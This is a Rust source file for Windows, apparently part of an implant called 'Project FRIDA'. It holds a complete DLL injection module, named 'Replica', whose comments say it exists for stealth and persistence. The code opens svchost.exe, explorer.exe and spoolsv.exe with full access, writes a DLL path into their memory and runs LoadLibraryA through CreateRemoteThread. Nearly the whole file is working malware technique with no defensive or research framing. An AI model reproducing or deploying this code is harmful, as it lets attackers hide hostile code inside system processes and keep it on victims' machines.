#![cfg(windows)]
//! Process injection module for Project FRIDA.
//!
//! This module, named "Replica," is responsible for injecting the agent's code
//! into other running processes to enhance stealth and persistence. The initial
//! implementation focuses on Windows using the `CreateRemoteThread` technique.

use crate::Log;
use std::collections::HashSet;
use std::ffi::{c_void, CStr, CString};
use std::mem;
use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};
use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
use winapi::um::processthreadsapi::{CreateRemoteThread, OpenProcess};
use winapi::um::tlhelp32::{
    CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS,
};
use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PROCESS_ALL_ACCESS};

/// Finds all processes by name and returns their process IDs (PIDs).
fn find_process_pids(process_name: &str) -> Vec<u32> {
    let mut pids = Vec::new();
    let snapshot_handle = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) };

    if snapshot_handle == INVALID_HANDLE_VALUE {
        return pids;
    }

    let mut process_entry: PROCESSENTRY32 = unsafe { mem::zeroed() };
    process_entry.dwSize = mem::size_of::<PROCESSENTRY32>() as u32;

    if unsafe { Process32First(snapshot_handle, &mut process_entry) } != 0 {
        loop {
            let current_process_name = unsafe { CStr::from_ptr(process_entry.szExeFile.as_ptr()) };
            if current_process_name.to_string_lossy().eq_ignore_ascii_case(process_name) {
                pids.push(process_entry.th32ProcessID);
            }
            if unsafe { Process32Next(snapshot_handle, &mut process_entry) } == 0 {
                break;
            }
        }
    }

    unsafe { CloseHandle(snapshot_handle) };
    pids
}

/// Injects a DLL into a target process specified by its PID.
fn inject_dll(pid: u32, dll_path: &str) -> Result<(), String> {
    unsafe {
        let process_handle = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
        if process_handle.is_null() {
            return Err(format!("Failed to open target process PID: {}", pid));
        }

        let dll_path_c = CString::new(dll_path).map_err(|e| e.to_string())?;
        let dll_path_len = dll_path_c.as_bytes_with_nul().len();

        let remote_memory = VirtualAllocEx(
            process_handle,
            std::ptr::null_mut(),
            dll_path_len,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if remote_memory.is_null() {
            CloseHandle(process_handle);
            return Err("Failed to allocate memory in target process".to_string());
        }

        let mut bytes_written = 0;
        if WriteProcessMemory(
            process_handle,
            remote_memory,
            dll_path_c.as_ptr() as *const c_void,
            dll_path_len,
            &mut bytes_written,
        ) == 0
            || bytes_written != dll_path_len
        {
            CloseHandle(process_handle);
            return Err("Failed to write DLL path to target process".to_string());
        }

        let kernel32_handle = GetModuleHandleA(b"kernel32.dll\0".as_ptr() as *const i8);
        let load_library_addr = GetProcAddress(kernel32_handle, b"LoadLibraryA\0".as_ptr() as *const i8);

        if load_library_addr.is_null() {
            CloseHandle(process_handle);
            return Err("Failed to get LoadLibraryA address".to_string());
        }

        let thread_handle = CreateRemoteThread(
            process_handle,
            std::ptr::null_mut(),
            0,
            Some(mem::transmute(load_library_addr)),
            remote_memory,
            0,
            std::ptr::null_mut(),
        );

        CloseHandle(process_handle);

        if thread_handle.is_null() {
            return Err("Failed to create remote thread in target process".to_string());
        }

        CloseHandle(thread_handle);
        Ok(())
    }
}

/// Identifies target processes and injects the agent DLL into them.
pub fn replicate_to_targets() -> usize {
    const TARGET_PROCESSES: &[&str] = &["svchost.exe", "explorer.exe", "spoolsv.exe"];
    const AGENT_DLL_NAME: &str = "agent.dll";

    let dll_path = match std::env::current_exe() {
        Ok(mut path) => {
            path.pop();
            path.push(AGENT_DLL_NAME);
            path
        }
        Err(e) => {
            Log::error(format!("Failed to get current executable path: {}", e));
            return 0;
        }
    };

    if !dll_path.exists() {
        Log::error(format!("Agent DLL not found at: {}", dll_path.display()));
        return 0;
    }

    let dll_path_str = match dll_path.to_str() {
        Some(s) => s,
        None => {
            Log::error("DLL path contains invalid UTF-8 characters.".to_string());
            return 0;
        }
    };

    Log::info(format!("Starting agent replication. DLL: {}", dll_path.display()));

    let mut injected_pids = HashSet::new();
    for process_name in TARGET_PROCESSES {
        let pids = find_process_pids(process_name);
        if pids.is_empty() {
            Log::info(format!("No running processes found for '{}'", process_name));
            continue;
        }

        for pid in pids {
            if injected_pids.contains(&pid) {
                continue; // Already injected into this process
            }
            match inject_dll(pid, dll_path_str) {
                Ok(_) => {
                    Log::info(format!("Successfully injected agent into {} (PID: {})", process_name, pid));
                    injected_pids.insert(pid);
                }
                Err(e) => {
                    Log::error(format!("Failed to inject into {} (PID: {}): {}", process_name, pid, e));
                }
            }
        }
    }

        Log::info(format!(
        "Agent replication complete. Injected into {} processes.",
        injected_pids.len()
    ));
    injected_pids.len()
}
